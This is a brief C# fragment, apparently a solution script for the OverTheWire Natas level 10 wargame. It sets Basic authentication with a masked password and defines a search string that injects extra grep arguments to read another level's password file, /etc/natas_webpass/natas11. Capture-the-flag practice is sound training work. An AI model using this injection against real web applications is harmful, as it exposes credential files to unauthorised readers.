...
client.BaseAddress = new Uri("http://natas10.natas.labs.overthewire.org");
...
string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas10:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);

string needle = ".* /etc/natas_webpass/natas11 #";
